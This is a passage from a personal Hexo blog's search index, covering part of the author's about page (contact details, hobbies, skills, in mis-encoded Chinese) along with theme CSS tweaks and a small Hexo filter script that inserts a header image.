src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/img/about1.jpg">    <div class="content">        <h2>è”ç³»æ–¹å¼</h2>        <ul>            <li>é‚®ç®±: 2488218724@qq.com</li>            <li>GitHub: https://github.com/lisien11</li>        </ul>    </div></div><div class="section left">    <img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/img/about3.jpg">    <div class="content">        <h2>ä¸ªäººå…´è¶£</h2>        <ul>            <li>çœ‹å°è¯´ï¼ŒåŠ¨æ¼«,çœ‹å„ç§çŸ¥è¯†åšä¸»?</li>            <li>ç½‘å®‰åº”è¯¥ä¹Ÿç®—å§ï¼Œä½†æ˜¯å›½å†…çš„å„ç§æ¯”èµ›å’Œç½‘å®‰ç¯å¢ƒï¼ŒçœŸçš„ä¼šæ¶ˆç£¨ä¸€ä¸ªäººå¯¹ç½‘å®‰çš„å…´è¶£</li>        </ul>    </div></div><div class="section right">    <img src="https://raw.githubusercontent.com/lisien11/lisien11.github.io/refs/heads/master/img/about4.jpg">    <div class="content">        <h2>æŠ€èƒ½</h2>        <ul>            <li>ä¸“ä¸šæŠ€èƒ½: Cã€Javaã€Pythonã€Linuxã€HTMLã€CSSã€JavaScriptã€phpï¼ˆéƒ½ä¼šä¸€äº›ä½†éƒ½ä¸ç²¾ï¼Œæ‚²Ï€__Ï€ï¼‰</li>        </ul>    </div></div><div class="wrapper"><h1 id="æœ€åå¸Œæœ›çœ‹åˆ°è¿™é‡Œçš„ä½ å’Œæˆ‘æ¯å¤©éƒ½èƒ½å¼€å¿ƒ"><a href="#æœ€åå¸Œæœ›çœ‹åˆ°è¿™é‡Œçš„ä½ å’Œæˆ‘æ¯å¤©éƒ½èƒ½å¼€å¿ƒ" class="headerlink" title="æœ€åå¸Œæœ›çœ‹åˆ°è¿™é‡Œçš„ä½ å’Œæˆ‘æ¯å¤©éƒ½èƒ½å¼€å¿ƒ"></a>æœ€åå¸Œæœ›çœ‹åˆ°è¿™é‡Œçš„ä½ å’Œæˆ‘æ¯å¤©éƒ½èƒ½å¼€å¿ƒ</h1><p><img src="../å›¾ç‰‡/111111.jpg" alt="alt text"></p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/modify.css"/>
      <url>/css/modify.css</url>
      
        <content type="html"><![CDATA[#page-header {  background: transparent !important;}#page-header.post-bg,#page-header.not-home-page {  height: 280px !important;}#page-header #post-info {  bottom: 40px !important;  text-align: center;}#page-header #page-site-info {  top: 140px !important;}@media screen and (max-width: 768px) {  #page-header.not-home-page {    height: 200px !important;  }  #page-header #post-info {    bottom: 10px !important;  }  #page-header #page-site-info {    top: 100px !important;  }}.top-img {  height: 250px;  margin: -50px -40px 50px;  border-top-left-radius: inherit;  border-top-right-radius: inherit;  background-position: center center;  background-size: cover;  -webkit-transition: all 0.3s;  -moz-transition: all 0.3s;  -o-transition: all 0.3s;  -ms-transition: all 0.3s;  transition: all 0.3s;}@media screen and (max-width: 768px) {  .top-img {    height: 230px;    margin: -36px -14px 36px;  }}[data-theme='dark'] .top-img {  filter: brightness(0.8);}#footer:before {  background-color: rgba(255,255,255,0.5);}[data-theme='dark'] #footer:before {  background-color: rgba(0,0,0,0.5);}#footer-wrap,#footer-wrap a {  color: #111;  -webkit-transition: unset;  -moz-transition: unset;  -o-transition: unset;  -ms-transition: unset;  transition: unset;}[data-theme='dark'] #footer-wrap,[data-theme='dark'] #footer-wrap a {  color: var(--light-grey);}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/LSE.css"/>
      <url>/css/LSE.css</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/transpancy.css"/>
      <url>/css/transpancy.css</url>
      
        <content type="html"><![CDATA[/* æ–‡ç« é¡µèƒŒæ™¯ */.layout_post>#post {    /* ä»¥ä¸‹ä»£è¡¨é€æ˜åº¦ä¸º0.7 å¯ä»¥è‡ªè¡Œä¿®æ”¹*/    background: rgba(255,255,255,.8);} /* æ‰€æœ‰é¡µé¢èƒŒæ™¯ */#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post{    /* ä»¥ä¸‹ä»£è¡¨é€æ˜åº¦ä¸º0.7 */    background: rgba(255,255,255,.8);}/*ä¾§è¾¹å¡ç‰‡çš„é€æ˜åº¦ */:root {  --card-bg: rgba(255, 255, 255, .8);}/* é¡µè„šé€æ˜ */#footer {/* ä»¥ä¸‹ä»£è¡¨é€æ˜åº¦ä¸º0.7 */background: rgba(255,255,255, .0);}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/LSE.js"/>
      <url>/js/LSE.js</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>å‹æƒ…é“¾æ¥</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/scripts/modify.js"/>
      <url>/scripts/modify.js</url>
      
        <content type="html"><![CDATA['use strict';const { filter } = hexo.extend;const cheerio = require('cheerio');/** * åœ¨é¡µé¢æ’å…¥æ–°é¡¶éƒ¨å›¾ * @param {cheerio.Root} $ Root */function insertTopImg($) {    const header = $('#page-header');    if (header.length === 0) return;    const background = header.css('background-image');    if (!background) return;    $('#post, #page, #archive, #tag, #category').prepend(`<div class="top-img" style="background-image: ${background};"></div>`);}// ä¿®æ”¹ HTMLfilter.register('after_render:html', (str, data) => {    const $ = cheerio.load(str, {        decodeEntities: false    });    insertTopImg($);    return $.html();});]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªæ™®é€šå¤§å­¦ç”Ÿçš„æ ‡ç­¾é¡µ</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªæ™®é€šå¤§å­¦ç”Ÿçš„æ ‡ç­¾é¡µ</title>
      <link href="/tag/index.html"/>
      <url>/tag/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
